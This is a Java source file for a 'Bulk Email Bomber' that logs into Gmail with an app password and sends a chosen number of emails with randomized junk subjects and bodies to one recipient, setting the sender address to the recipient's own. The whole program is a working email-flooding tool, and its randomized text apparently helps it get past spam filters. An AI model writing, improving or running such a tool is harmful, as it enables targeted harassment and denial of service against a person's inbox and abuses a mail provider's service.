/*----------------------------------------------------------------------------------------------------------------------
    SETUP INSTRUCTIONS:
    - Add the JavaMail API to your project’s classpath:
    https://www.oracle.com/java/technologies/javamail-releases.html

    (Optional) For SMTP, add the JavaMail SMTP Transport API:
    https://mvnrepository.com/artifact/com.sun.mail/smtp.

    GMAIL ACCOUNT CONFIGURATION:
    - Enable "App Passwords" in your Gmail settings for secure access via the JavaMail API.
    - Generate a unique password for your account specifically for this program.

    GITHUB REPOSITORY:
    - Visit the GitHub repository for information and tutorials related to this project.
    - https://github.com/GraycenMacNeill/BulkEmailBomber
----------------------------------------------------------------------------------------------------------------------*/

package com.github.GraycenMacNeill.BulkEmailBomber;

import javax.mail.*;
import javax.mail.internet.*;
import java.util.*;
import java.lang.Thread;
import java.util.concurrent.ThreadLocalRandom;

public class Main {

    private static final String RED = "\u001B[31m";
    private static final String WHITE = "\u001B[0m";

    public static void main(String[] args) {

        displayInformation();

        UserInteraction userInteraction = new UserInteraction();

        String subjectBase = "default";
        String bodyBase = "default";

        String senderEmail = userInteraction.getSenderEmail(); // STEP 1: Get sender email
        String password = userInteraction.getPassword(); // STEP 2: Get the Gmail App Password
        String recipientEmail = userInteraction.getRecipientEmail(); // STEP 3: Get the recipient email
        int numberOfEmailsToSend = userInteraction.getNumberOfEmailsToSend(); // STEP 4: Get number of emails to send
        int emailTemplate = userInteraction.getEmailTemplate(); // STEP 5: Get the email template

        if (emailTemplate == 1) { // Fastest Email Generation
            subjectBase = "01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950";
            bodyBase = "01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950";
            delay(1000);

        } else if (emailTemplate == 2) { // Fast Email Generation
            subjectBase = "apple banana basketball date egg frog Napoleon honey imitation jack-fruit work lemon mango computer pear";
            bodyBase = "angry banana cherry date egg frog daily honey imitation jack-fruit kangaroo lemon day orange need";
            delay(1000);

        } else if (emailTemplate == 3) { // Slow Email Generation
            subjectBase = "¡™£¢∞§¶•ªº–≠œ∑´®†¥¨ˆøπ«åß∂ƒ©˙∆˚¬…æΩ≈ç√∫˜µ≤≥µ";
            bodyBase = "¡™£¢∞§¶•ªº–≠œ∑´®†¥¨ˆøπ«åß∂ƒ©˙∆˚¬…æΩ≈ç√∫˜µ≤≥µ";
            delay(1000);

        }  else if (emailTemplate == 4) { // Very Slow Email Generation
            subjectBase = "ツ♋웃유Σ⊗♒☠☮☯♠Ω♤♣♧♥♡♦♢♔♕♚♛★☆✮✯☄☾☽☼☀☁☂☃☻☺۞۩♬✄✂✆✉✦✧∞❤❥❦❧™®©✗✘⊗♒▢▲△▼▽◆◇○◎●◯Δ◕◔ʊϟღ回₪✓✔✕✖☢☣";
            bodyBase = "ツ♋웃유Σ⊗♒☠☮☯♠Ω♤♣♧♥♡♦♢♔♕♚♛★☆✮✯☄☾☽☼☀☁☂☃☻☺۞۩♬✄✂✆✉✦✧∞❤❥❦❧™®©✗✘⊗♒▢▲△▼▽◆◇○◎●◯Δ◕◔ʊϟღ回₪✓✔✕✖☢☣";
            delay(1000);

        } else if (emailTemplate == 5) { // Slowest Email Generation
            subjectBase = "Ǆஹ௸௵ဪ﷽ÿþýüûúù﷽ø÷öõôòñðïîíìëêéè﷽çæåäãâáàßÞÝÜÛÚÙØÖÕÔÒǄஹ௸௵ဪÿ﷽";
            bodyBase = "Ǆஹ௸௵ဪ﷽ÿþýüûúù﷽ø÷öõôòñðïîíìëêéè﷽çæåäãâáàßÞÝÜÛÚÙØÖÕÔÒǄஹ௸௵ဪÿ﷽";
            delay(1000);

        }

        loadingScreen();

        // Email configuration (this uses Gmail's App Password)
        // For security reasons, never hardcode your credentials in your code!!!
        Properties mailProps = new Properties();
        mailProps.put("mail.smtp.host", "smtp.gmail.com");
        mailProps.put("mail.smtp.port", 587);
        mailProps.put("mail.smtp.auth", true);
        mailProps.put("mail.smtp.starttls.enable", true);

        // Create a Session object with password authentication
        // The password variable will be replaced with your Gmail App Password
        Session session = Session.getInstance(mailProps, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return
                        new PasswordAuthentication(senderEmail, password); // Use the password variable
            }
        });

        for (int i = 0; i < numberOfEmailsToSend; i++) {
            try {
                // Create a new message object for each email
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(recipientEmail));

                // Generate random subject and body variations
                // This could be optimized by using a more efficient data structure or algorithm for generating random strings
                String randomSubject = generateRandomString(subjectBase);
                String randomBody = generateRandomString(bodyBase);

                // Set the email subject and body to the randomized strings
                message.setSubject(randomSubject);
                message.setText(randomBody);

                // Update recipient address
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipientEmail));

                // Transmit the message through the Transport object and sends to the
                // recipient's email address.
                Transport.send(message);
                System.out.println("Email sent to " + senderEmail);
            } catch (MessagingException e) {
                System.err.println("An error occurred while sending the email: " + e.getMessage());
            }

        }

    }

    // Function to delay the execution of the program for a specified number of milliseconds
    public static void delay(int milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            System.err.println(RED + "Thread was interrupted, failed to complete delay");
        }
    }

    // Function to generate random string with a specified base string
    // Generate random length up to 5 characters longer than base
    public static String generateRandomString(String base) {
        int baseLength = base.length(); // Store the length of the base string
        int randomLength = ThreadLocalRandom.current().nextInt(baseLength + 5);
        StringBuilder randomStringBuilder = new StringBuilder(randomLength);

        for (int j = 0; j < randomLength; j++) {
            int randomIndex = ThreadLocalRandom.current().nextInt(baseLength); // Reuse baseLength
            randomStringBuilder.append(base.charAt(randomIndex));
        }
        return randomStringBuilder.toString();
    }

    // Function to display program information and legal cautions
    // To prevent misuse, the pro gram displays a warning message and a link to the GitHub repository.
    public static void displayInformation() {
        System.out.println(WHITE + "Bulk Email Bomber (BEB) is a general use tool designed to efficiently");
        System.out.println("send large volumes of emails using Gmail to a specific recipient.");
        System.out.println("\nhttps://github.com/GraycenMacNeill/BulkEmailBomber");
    }

    public static void loadingScreen() {
        String[] loadingSteps = {"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"};  // Loading animations

        for (int i = 0; i < 3; i++) {  // Loop for a few iterations of the animation
            for (String step : loadingSteps) {
                System.out.print("\r" + step);  // \r moves the cursor back to the start of the line
                delay(100);  // Delay between steps, 100 milliseconds
            }
        }
        System.out.println("\rSending emails to recipient:         \n");
    }

}